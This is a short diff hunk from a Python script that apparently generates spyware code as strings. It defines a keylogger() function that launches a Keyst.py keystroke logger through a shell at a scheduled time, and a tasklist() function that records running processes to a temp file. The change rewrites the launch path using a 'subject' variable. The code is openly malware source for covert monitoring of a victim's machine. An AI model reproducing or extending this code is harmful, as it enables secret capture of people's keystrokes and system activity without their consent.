@@ -24,7 +24,7 @@ def keylogger():\n\n\
     fix = \""+timing+"\"\n\n\
     t = str(datetime.datetime.now().strftime(\"%H\")) + str(datetime.datetime.now().strftime(\"%M\")) +  str(datetime.datetime.now().strftime(\"%S\"))\n\
     if t >= fix:\n\
-        subprocess.Popen('python Keyst.py', shell=True)\n\n\
+        subprocess.Popen(\"python " + subject + "\\Keyst.py\", shell=True)\n\n\
 def tasklist():\n\
     subprocess.run(\"tasklist /fi \\\"STATUS eq RUNNING\\\" > Temp\\\\running.txt\", shell=True)\n\
     with open(\"Temp/running.txt\", 'r') as r:\n\
